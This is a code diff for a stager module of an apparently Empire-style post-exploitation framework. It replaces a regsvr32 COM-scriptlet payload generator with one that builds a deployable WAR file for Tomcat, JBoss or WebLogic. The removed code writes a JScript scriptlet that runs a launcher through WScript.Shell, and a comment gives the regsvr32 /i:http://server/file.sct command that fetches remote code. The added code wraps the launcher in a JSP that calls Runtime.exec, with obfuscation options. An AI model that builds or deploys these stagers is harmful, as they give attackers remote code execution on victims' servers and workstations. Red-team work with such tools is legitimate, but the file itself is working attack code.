@@ -1,4 +1,6 @@
+import io
 import logging
+import zipfile
 
 log = logging.getLogger(__name__)
 
@@ -6,29 +8,21 @@ log = logging.getLogger(__name__)
 class Stager:
     def __init__(self, mainMenu):
         self.info = {
-            "Name": "regsvr32",
+            "Name": "WAR",
             "Authors": [
                 {
-                    "Name": "",
-                    "Handle": "@subTee",
+                    "Name": "Andrew Bonstrom",
+                    "Handle": "@ch33kyf3ll0w",
                     "Link": "",
-                },
-                {
-                    "Name": "",
-                    "Handle": "@enigma0x3",
-                    "Link": "",
-                },
+                }
             ],
-            "Description": "Generates an sct file (COM Scriptlet) Host this anywhere",
+            "Description": "Generates a Deployable War file.",
             "Comments": [
-                "On the endpoint simply launch regsvr32 /u /n /s /i:http://server/file.sct scrobj.dll "
+                "You will need to deploy the WAR file to activate. Great for interfaces that accept a WAR file such as Apache Tomcat, JBoss, or Oracle Weblogic Servers."
             ],
         }
 
-        # any options needed by the stager, settable during runtime
         self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
             "Listener": {
                 "Description": "Listener to generate stager for.",
                 "Required": True,
@@ -38,7 +32,7 @@ class Stager:
                 "Description": "Language of the stager to generate.",
                 "Required": True,
                 "Value": "powershell",
-                "SuggestedValues": ["powershell", "ironpython", "csharp"],
+                "SuggestedValues": ["powershell", "csharp", "ironpython"],
                 "Strict": True,
             },
             "StagerRetries": {
@@ -46,15 +40,18 @@ class Stager:
                 "Required": False,
                 "Value": "0",
             },
-            "Base64": {
-                "Description": "Switch. Base64 encode the output.",
+            "AppName": {
+                "Description": "Name for the .war/.jsp. Defaults to listener name.",
+                "Required": False,
+                "Value": "",
+            },
+            "OutFile": {
+                "Description": "Filename that should be used for the generated output.",
                 "Required": True,
-                "Value": "True",
-                "SuggestedValues": ["True", "False"],
-                "Strict": True,
+                "Value": "empire.war",
             },
             "Obfuscate": {
-                "Description": "Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
+                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                 "Required": False,
                 "Value": "False",
                 "SuggestedValues": ["True", "False"],
@@ -64,11 +61,6 @@ class Stager:
                 "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
                 "Required": False,
                 "Value": r"Token\All\1",
-            },
-            "OutFile": {
-                "Description": "Filename that should be used for the generated output.",
-                "Required": False,
-                "Value": "launcher.sct",
             },
             "UserAgent": {
                 "Description": "User-agent string to use for the staging request (default, none, or other).",
@@ -87,29 +79,25 @@ class Stager:
             },
         }
 
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
 
     def generate(self):
-        # extract all of our options
         language = self.options["Language"]["Value"]
         listener_name = self.options["Listener"]["Value"]
-        base64 = self.options["Base64"]["Value"]
-        obfuscate = self.options["Obfuscate"]["Value"]
-        obfuscate_command = self.options["ObfuscateCommand"]["Value"]
+        app_name = self.options["AppName"]["Value"]
         user_agent = self.options["UserAgent"]["Value"]
         proxy = self.options["Proxy"]["Value"]
         proxy_creds = self.options["ProxyCreds"]["Value"]
         stager_retries = self.options["StagerRetries"]["Value"]
-
-        encode = False
-        if base64.lower() == "true":
-            encode = True
+        obfuscate = self.options["Obfuscate"]["Value"]
+        obfuscate_command = self.options["ObfuscateCommand"]["Value"]
 
         obfuscate_script = False
         if obfuscate.lower() == "true":
             obfuscate_script = True
+
+        if app_name == "":
+            app_name = listener_name
 
         if language in ["csharp", "ironpython"]:
             if (
@@ -125,17 +113,16 @@ class Stager:
 
             launcher = self.mainMenu.stagergenv2.generate_exe_oneliner(
                 language=language,
-                obfuscate=obfuscate_script,
+                obfuscate=obfuscate,
                 obfuscation_command=obfuscate_command,
-                encode=encode,
+                encode=True,
                 listener_name=listener_name,
             )
-
         elif language == "powershell":
             launcher = self.mainMenu.stagergenv2.generate_launcher(
-                listener_name=listener_name,
+                listener_name,
                 language=language,
-                encode=encode,
+                encode=True,
                 obfuscate=obfuscate_script,
                 obfuscation_command=obfuscate_command,
                 user_agent=user_agent,
@@ -145,30 +132,39 @@ class Stager:
             )
 
         if launcher == "":
-            log.error("[!] Error in launcher command generation.")
+            log.error("Error in launcher command generation.")
             return ""
 
-        code = '<?XML version="1.0"?>\n'
-        code += "<scriptlet>\n"
-        code += "<registration\n"
-        code += 'description="Win32COMDebug"\n'
-        code += 'progid="Win32COMDebug"\n'
-        code += 'version="1.00"\n'
-        code += 'classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"\n'
-        code += " >\n"
-        code += ' <script language="JScript">\n'
-        code += "      <![CDATA[\n"
-        code += (
-            '           var r = new ActiveXObject("WScript.Shell").Run(\''
-            + launcher.replace("'", "\\'")
-            + "');\n"
-        )
-        code += "      ]]>\n"
-        code += " </script>\n"
-        code += "</registration>\n"
-        code += "<public>\n"
-        code += '    <method name="Exec"></method>\n'
-        code += "</public>\n"
-        code += "</scriptlet>\n"
+        manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_35 (Sun Microsystems Inc.)\r\n\r\n"
 
-        return code
+        jsp_code = (
+            '''<%@ page import="java.io.*" %>
+<%
+Process p=Runtime.getRuntime().exec("'''
+            + str(launcher)
+            + """");
+%>
+"""
+        )
+
+        wxml_code = f"""<?xml version="1.0"?>
+<!DOCTYPE web-app PUBLIC
+"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
+"http://java.sun.com/dtd/web-app_2_3.dtd">
+<web-app>
+<servlet>
+<servlet-name>{app_name}</servlet-name>
+<jsp-file>/{app_name}.jsp</jsp-file>
+</servlet>
+</web-app>
+"""
+
+        war_file = io.BytesIO()
+        zip_data = zipfile.ZipFile(war_file, "w", zipfile.ZIP_DEFLATED)
+
+        zip_data.writestr("META-INF/MANIFEST.MF", manifest)
+        zip_data.writestr("WEB-INF/web.xml", wxml_code)
+        zip_data.writestr(f"{app_name}.jsp", jsp_code)
+        zip_data.close()
+
+        return war_file.getvalue()
